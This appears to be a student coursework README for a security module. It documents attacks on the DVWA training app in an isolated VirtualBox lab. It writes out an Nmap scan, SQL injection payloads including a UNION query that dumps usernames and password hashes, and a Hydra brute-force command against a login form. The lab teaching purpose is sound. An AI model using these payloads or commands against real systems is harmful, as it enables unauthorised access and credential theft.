# ELEC0138 Security & Privacy

---

## Overview

This repository contains all code, data, and setup documentation for CW1 of ELEC0138. The coursework simulates a corporate IT infrastructure (AcmeCorp) and demonstrates three realistic attack scenarios using industry-standard ethical hacking tools, all conducted in an isolated VirtualBox lab environment.

---

## Lab Environment

| Machine | OS | IP | Role |
|---|---|---|---|
| Attacker | Kali Linux 2026.1 (ARM64) | 10.0.0.1 | Attack platform |
| Target | Ubuntu Server 24.04 (ARM64) | 10.0.0.2 | DVWA web server |

Both VMs are connected via a VirtualBox internal network named `corpnet` (10.0.0.0/24). No external traffic was involved in any attack.

---

## Attacks Demonstrated

### 1. Network Reconnaissance — Nmap
**Command:**
```bash
nmap -sV -sC -p 80 10.0.0.2
```
**Finding:** Port 80 open, running Apache httpd 2.4.58 (Ubuntu). Server broadcasts its exact version in HTTP response headers — an information disclosure vulnerability (CWE-200) that enables targeted CVE lookups.

---

### 2. SQL Injection — Manual (DVWA) + Automated (Python)
**Target:** `http://10.0.0.2/dvwa/vulnerabilities/sqli/`
**Vulnerability:** CWE-89 | OWASP A03:2021 — Injection

**Phase 1 — Boolean injection** (dump all records):
```
1' OR '1'='1
```

**Phase 2 — UNION injection** (exfiltrate credentials):
```
1' UNION SELECT user, password FROM users #
```

**Result:** All 5 employee usernames and MD5 password hashes exfiltrated. Hash `5f4dcc3b5aa765d61d8327deb882cf99` cracked instantly via CrackStation to `password`.

**Python script** (`code/sql_injection_demo.py`): standalone demonstration using Python's built-in `sqlite3` library — no live server required. Creates a simulated corporate database, runs both injection payloads, and saves results to `sql_injection_results.txt`.

```bash
python3 sql_injection_demo.py
```

---

### 3. Brute Force — Hydra
**Vulnerability:** CWE-307 | OWASP A07:2021 — Identification and Authentication Failures

**Target:** `http://10.0.0.2/dvwa/vulnerabilities/brute/` (DVWA Brute Force vulnerability page, security level: Low)

**Command:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.2 \
  http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect:H=Cookie:PHPSESSID=<YOUR_PHPSESSID>;security=low" \
  -t 4 -V -f
```

**Note:** A valid session cookie (`PHPSESSID`) is required to access the authenticated vulnerability page. The `-f` flag stops Hydra immediately upon finding the first valid credential.

**Result:** Valid admin credential recovered — `password` — found at attempt 4 of 14,344,399. No rate limiting or account lockout was triggered. The server accepted all attempts without restriction.

---

## How to Replicate

See `setup/lab_setup_commands.sh` for the complete step-by-step terminal commands to build the lab from scratch, including VM network configuration, DVWA installation, and all attack commands.

---

## Disclaimer

All attacks were performed in a fully isolated virtual lab environment for educational purposes only. No real systems were targeted. This work is submitted in accordance with UCL's academic integrity policy.
